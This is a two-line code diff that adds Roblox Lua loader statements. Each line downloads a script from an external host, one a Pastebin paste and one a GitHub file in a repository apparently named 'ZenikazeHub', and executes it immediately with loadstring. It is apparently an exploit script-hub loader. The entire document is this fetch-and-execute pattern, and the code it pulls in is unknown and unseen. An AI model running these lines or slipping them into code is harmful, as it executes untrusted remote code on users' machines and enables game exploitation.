@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://pastebin.com/raw/TFbjwUCL"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ZenithExility/ZenikazeHub/main/ZenikazeNCMD"))()
